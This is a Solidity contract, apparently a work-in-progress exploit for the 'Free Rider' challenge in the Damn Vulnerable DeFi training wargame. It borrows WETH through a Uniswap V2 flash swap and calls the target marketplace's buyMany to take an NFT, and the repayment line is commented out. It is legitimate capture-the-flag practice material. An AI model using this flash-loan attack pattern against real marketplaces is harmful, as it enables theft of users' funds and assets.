// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "solmate/src/tokens/WETH.sol";
import "hardhat/console.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(
    address sender,
    uint amount0,
    uint amount1,
    bytes calldata data
  ) external;
}

contract UniswapFlashSwap is IUniswapV2Callee, IERC721Receiver {
  // Uniswap V2 router
  // 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
  address private dvt;
  // Uniswap V2 factory
  address private factory ;
  FreeRiderNFTMarketplace market;
  DamnValuableNFT nft;

  event Log(string message, uint val);
  constructor(address _dvt, address _factory, address payable _market, address _nft) {
    dvt = _dvt;
    factory = _factory;
    market = FreeRiderNFTMarketplace(_market);
    nft = DamnValuableNFT(_nft);
  }

  function onERC721Received(
          address operator,
          address from,
          uint256 tokenId,
          bytes calldata data
      ) external returns (bytes4) {
        
        return IERC721Receiver.onERC721Received.selector;
      }
  function flashSwap(address _tokenBorrow, uint _amount) external {
    address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
    require(pair != address(0), "!pair");

    address token0 = IUniswapV2Pair(pair).token0();
    address token1 = IUniswapV2Pair(pair).token1();
    uint amount0Out = _tokenBorrow == token0 ? _amount : 0;
    uint amount1Out = _tokenBorrow == token1 ? _amount : 0;

    emit Log("Before BALANCE TOKEN 0", IERC20(token0).balanceOf(address(this)));

    //vv important, struggled forgeting this 
    //if last parameter (data == "") is empty, it will do a normal swap
    // we need to pass data to trigger the uniswapV2Callee call, which is nothing but flash loan
    bytes memory data = abi.encode(_tokenBorrow, _amount);

    IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
  }

  // called by pair contract
  //So inside this function you can perform anything with borrowed token and then at the end repay the borrowed token
  function uniswapV2Call(
    address _sender,
    uint _amount0,
    uint _amount1,
    bytes calldata _data
  ) external override {
    address token0 = IUniswapV2Pair(msg.sender).token0();
    address token1 = IUniswapV2Pair(msg.sender).token1();
    address pair = IUniswapV2Factory(factory).getPair(token0, token1);
    require(msg.sender == pair, "!pair");
    require(_sender == address(this), "!sender");

    (address payable tokenBorrow, uint amount) = abi.decode(_data, (address, uint));

    // about 0.3%
    uint fee = ((amount * 3) / 997) + 1;
    uint amountToRepay = amount + fee;

    // do stuff here
    emit Log("amount", amount);
    emit Log("amount0", _amount0);
    emit Log("amount1", _amount1);
    emit Log("fee", fee);
    console.log("amount to repay", amountToRepay);

    //OPTIONAL - check balance of tokens to verify the loan
    uint256 balance0 = IERC20(token0).balanceOf(address(this));
    uint256 balance1 = IERC20(token1).balanceOf(address(this));
    emit Log("After BALANCE TOKEN 0", balance0);
    emit Log("After BALANCE TOKEN 1", balance1);
    console.log("After BALANCE TOKEN 0: ", balance0);
    console.log("After BALANCE TOKEN 1: ", balance1);

    uint256[] memory tokenIds = new uint256[](1);
    tokenIds[0] = 0;
    console.log("contract Balance: ", address(this).balance);
    WETH(tokenBorrow).withdraw(balance0);
    console.log("Now contract Balance: ", address(this).balance);
    market.buyMany{value: 15 ether}(tokenIds);
    console.log("bought", nft.ownerOf(0));
    console.log("bought", address(this));

    //IERC20(tokenBorrow).transfer(pair, amountToRepay); 
  }
  receive() external payable {
    console.log("Received Money");
  }
}